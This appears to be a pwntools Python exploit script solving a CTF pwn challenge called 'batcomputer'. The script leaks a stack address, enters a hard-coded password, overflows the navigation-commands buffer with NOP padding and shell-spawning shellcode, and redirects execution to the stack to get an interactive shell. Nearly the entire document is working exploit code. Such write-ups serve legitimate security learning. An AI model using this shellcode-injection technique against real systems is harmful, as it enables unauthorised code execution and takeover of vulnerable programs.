#!/usr/bin/python3
# @author: CryptoCat (https://github.com/Crypto-Cat/CTF/tree/main/pwn)
# Modified by An00bRektn
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
continue
'''.format(**locals())

# Binary filename
exe = './batcomputer'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

"""
    This challenge was a simple shellcode injection where triggering the
    buffer overflow is a little funky. After doing some initial reversing,
    we see that we can overflow the "navigation commands", but the crash
    only happens in a return. Sounds a little dumb of me to say that the
    crash doesn't immediately happen, but it was a nice reminder for me
    to remember how a buffer overflow actually works.
"""

offset = 84

# Start program
io = start()

io.sendlineafter(b'>', '1')
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info('leaked_addr: %#x', stack_addr)

shellcode = asm(shellcraft.popad()) # Pop registers to make room on stack
shellcode += asm(shellcraft.sh())
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
# We don't need to include the offset here like we usually do, hence the zero
payload = flat({
    0: [
        padding,
        shellcode,
        stack_addr
    ]
})

io.sendlineafter(b'>', '2')
io.sendlineafter(b'password:', 'b4tp@$$w0rd!')

# Send the payload
io.sendlineafter(b'commands:', payload)
io.sendlineafter(b'>', '3')
io.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")

# Got Shell?
io.interactive()
